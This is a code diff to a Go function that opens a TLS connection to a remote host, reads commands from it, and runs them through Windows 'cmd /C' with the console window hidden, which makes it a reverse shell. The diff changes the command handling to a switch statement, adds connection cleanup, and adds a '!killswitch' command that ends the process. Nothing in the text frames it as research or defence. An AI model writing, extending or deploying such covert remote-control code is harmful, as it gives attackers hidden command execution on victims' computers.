@@ -15,6 +15,7 @@ func Do(host string, conf *tls.Config) error {
 	if err != nil {
 		return err
 	}
+	defer c.Close()
 	cwd, err := os.Getwd()
 	if err != nil {
 		return err
@@ -27,7 +28,11 @@ func Do(host string, conf *tls.Config) error {
 			return err
 		}
 		tokens := strings.Fields(cmdstr)
-		if tokens[0] == "cd" && len(tokens) == 2 {
+		switch tokens[0] {
+		case "cd":
+			if len(tokens) != 2 {
+				continue
+			}
 			err := os.Chdir(tokens[1])
 			if err != nil {
 				c.Write([]byte(err.Error()))
@@ -35,8 +40,11 @@ func Do(host string, conf *tls.Config) error {
 			cwd, _ = os.Getwd()
 			cwd = cwd + "> "
 			continue
-		} else if tokens[0] == "exit" {
+		case "exit":
+			c.Close()
 			return nil
+		case "!killswitch":
+			os.Exit(0)
 		}
 		cmd := exec.Command("cmd", "/C", cmdstr)
 		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
